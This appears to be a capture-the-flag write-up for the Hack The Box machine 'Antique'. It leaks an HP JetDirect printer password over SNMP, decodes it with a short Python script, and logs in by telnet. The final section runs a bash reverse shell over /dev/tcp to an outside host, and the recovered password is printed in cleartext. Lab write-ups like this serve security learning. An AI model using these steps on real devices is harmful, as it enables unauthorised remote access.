| Port      | State | Service    | Version      |
| --------- | ----- | ---------- | ------------ |
| 23/tcp    | open  | telnet?    | HP JetDirect |
| 20222/tcp | open  | ipulse-ics |              |


```bash
┌─[✗]─[aexon@parrot]─[~/tools/reverse]
└──╼ $sudo nmap -sU --top-ports 10 -sV  10.10.11.107 -Pn
[sudo] password for aexon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 22:12 WIB
Nmap scan report for 10.10.11.107
Host is up (0.12s latency).

PORT     STATE  SERVICE      VERSION
53/udp   closed domain
67/udp   closed dhcps
123/udp  closed ntp
135/udp  closed msrpc
137/udp  closed netbios-ns
138/udp  closed netbios-dgm
161/udp  open   snmp         SNMPv1 server (public)
445/udp  closed microsoft-ds
631/udp  closed ipp
1434/udp closed ms-sql-m

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds

```


# User flag

refrense : https://www.exploit-db.com/exploits/22319
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce

command :
```bash
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

```bash
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

```python
# Mengambil nilai BITS dari string
bits_string = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 " \
              "33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 " \
              "37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 " \
              "82 83 86 90 91 94 95 98 103 106 111 114 115 119 " \
              "122 123 126 130 131 134 135"

# Pisahkan nilai heksadesimal menjadi list
hex_values = bits_string.split()

# Konversi nilai heksadesimal ke karakter ASCII
result_string = ''.join([chr(int(hex_value, 16)) for hex_value in hex_values])

print(result_string)
```


# RCE

```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Antique]
└──╼ $telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> exec bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"

```

